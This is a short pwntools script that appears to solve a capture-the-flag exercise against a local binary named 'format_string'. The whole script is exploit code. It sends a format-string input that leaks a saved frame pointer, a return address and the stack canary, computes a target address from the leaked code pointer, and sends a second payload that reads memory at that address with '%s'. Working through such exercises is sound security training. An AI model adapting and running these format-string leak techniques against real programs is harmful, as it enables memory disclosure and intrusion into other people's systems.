#!/usr/bin/env python3

import sys
from pwnlib.tubes.process import process

esp_to_ebp = 74
esp_to_ret = esp_to_ebp + 1
esp_to_canary = esp_to_ebp - 3
esp_to_buf1 = 7
esp_to_buf2 = 39
main_ret_to_unavailable = -212
old_fb_to_vuln_ret = -12

executable = './format_string'
format_string = ''
for i in [esp_to_ebp, esp_to_ret, esp_to_canary]:
    format_string += '%{}$08x '.format(str(i))
format_string = format_string[0:-1]

p = process(executable)
p.sendline(bytes(format_string, 'utf-8'))
arr = p.read().decode().strip('\n').split(' ')
stack, code, canary = arr

code_int = int('0x' + code, 16)
flag_addr = code_int + 11570

payload = flag_addr.to_bytes(4, 'little')
payload += b'\n%' + str(esp_to_buf2).encode() + b'$s'

p.sendline(payload)

out = p.recvall()
out = out.replace(b' ', b'')
sys.stdout.buffer.write(out)
